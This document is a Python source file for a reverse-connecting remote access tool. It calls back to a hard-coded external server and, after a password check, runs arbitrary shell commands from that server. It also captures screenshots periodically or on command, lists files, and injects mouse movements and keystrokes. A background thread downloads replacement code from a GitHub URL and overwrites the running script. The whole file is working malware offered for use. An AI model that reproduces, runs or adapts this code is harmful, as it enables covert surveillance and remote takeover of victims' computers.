import socket
import struct
import subprocess
import time
from io import BytesIO
from PIL import ImageGrab
import pyautogui
import threading
import os
import requests

SERVER_IP = '176.106.246.150' 
SERVER_PORT = 12536
PASSWORD = 'StrongPassword123'

UPDATE_URL = 'https://raw.githubusercontent.com/Dimonlomon/Private/refs/heads/main/server.py'
CHECK_INTERVAL = 300 

def send_data(sock, data: bytes):
    sock.sendall(struct.pack('>I', len(data)))
    sock.sendall(data)

def recv_data(sock) -> bytes:
    raw_len = sock.recv(4)
    if not raw_len:
        return b''
    length = struct.unpack('>I', raw_len)[0]
    data = b''
    while len(data) < length:
        packet = sock.recv(length - len(data))
        if not packet:
            break
        data += packet
    return data

def take_screenshot() -> bytes:
    img = ImageGrab.grab()
    buf = BytesIO()
    img.save(buf, format='PNG')
    return buf.getvalue()

auto_mode = False
stop_flag = threading.Event()

def screenshot_loop(sock, interval: int):
    while not stop_flag.is_set():
        try:
            send_data(sock, b'[AUTO] screenshot')
            img_data = take_screenshot()
            send_data(sock, img_data)
        except Exception as e:
            send_data(sock, f'[!] Auto screenshot error: {e}'.encode())
            break
        time.sleep(interval)

def auto_update():
    while True:
        try:
            print('[*] Checking for updates...')
            r = requests.get(UPDATE_URL, timeout=10)
            if r.status_code == 200:
                remote_code = r.text
                local_path = os.path.realpath(__file__)
                with open(local_path, 'r', encoding='utf-8') as f:
                    local_code = f.read()

                if remote_code != local_code:
                    print('[*] New version found. Updating...')
                    backup = local_path + '.bak'
                    os.replace(local_path, backup)
                    with open(local_path, 'w', encoding='utf-8') as f:
                        f.write(remote_code)
                    print('[*] Updated. Please restart manually.')
                    os._exit(0)
                else:
                    print('[*] Already up to date.')
            else:
                print(f'[!] Update check failed: HTTP {r.status_code}')
        except Exception as e:
            print(f'[!] Auto-update error: {e}')
        time.sleep(CHECK_INTERVAL)

def handle_connection(s):
    global auto_mode
    send_data(s, b'PASSWORD:')
    pwd = recv_data(s).decode()
    if pwd != PASSWORD:
        send_data(s, b'ACCESS DENIED')
        return
    send_data(s, b'ACCESS GRANTED')

    while True:
        try:
            cmd = recv_data(s).decode()
            if cmd.lower() in ('exit', 'quit'):
                break

            parts = cmd.strip().split()
            if not parts:
                continue

            action = parts[0].lower()

            if action == 'screenshot' and len(parts) >= 2 and parts[1] == 'auto':
                if auto_mode:
                    send_data(s, b'[*] Auto-screenshot already running')
                    continue
                try:
                    interval = int(parts[2]) if len(parts) > 2 else 180
                    stop_flag.clear()
                    threading.Thread(target=screenshot_loop, args=(s, interval), daemon=True).start()
                    auto_mode = True
                    send_data(s, f'[*] Auto-screenshot started every {interval} seconds'.encode())
                except Exception as e:
                    send_data(s, f'[!] Invalid interval: {e}'.encode())

            elif action == 'screenshot' and len(parts) == 2 and parts[1] == 'stop':
                if auto_mode:
                    stop_flag.set()
                    auto_mode = False
                    send_data(s, b'[*] Auto-screenshot stopped')
                else:
                    send_data(s, b'[*] Not running')

            elif action == 'screenshot':
                img_data = take_screenshot()
                send_data(s, img_data)

            elif action == 'ls':
                path = ' '.join(parts[1:]) or '.'
                try:
                    files = '\n'.join(os.listdir(path))
                    send_data(s, files.encode())
                except Exception as e:
                    send_data(s, f'ERROR: {e}'.encode())

            elif action == 'mouse_move':
                try:
                    x, y = map(int, parts[1:3])
                    pyautogui.moveTo(x, y)
                    send_data(s, b'OK')
                except Exception as e:
                    send_data(s, f'ERROR: {e}'.encode())

            elif action == 'mouse_click':
                try:
                    button = parts[1] if len(parts) > 1 else 'left'
                    clicks = int(parts[2]) if len(parts) > 2 else 1
                    pyautogui.click(button=button, clicks=clicks)
                    send_data(s, b'OK')
                except Exception as e:
                    send_data(s, f'ERROR: {e}'.encode())

            elif action == 'key_press':
                try:
                    pyautogui.press(parts[1])
                    send_data(s, b'OK')
                except Exception as e:
                    send_data(s, f'ERROR: {e}'.encode())

            elif action == 'key_write':
                try:
                    text = cmd[len('key_write'):].strip()
                    pyautogui.write(text)
                    send_data(s, b'OK')
                except Exception as e:
                    send_data(s, f'ERROR: {e}'.encode())

            else:
                try:
                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    send_data(s, out)
                except subprocess.CalledProcessError as e:
                    send_data(s, e.output)

        except Exception as e:
            try:
                send_data(s, f'[!] Exception: {e}'.encode())
            except:
                break

def connect_forever():
    threading.Thread(target=auto_update, daemon=True).start()
    while True:
        try:
            print(f'[*] Trying to connect to {SERVER_IP}:{SERVER_PORT}')
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_IP, SERVER_PORT))
                print('[+] Connected to server')
                handle_connection(s)
        except Exception as e:
            print(f'[!] Connection failed: {e}')
        time.sleep(10)

if __name__ == '__main__':
    connect_forever()

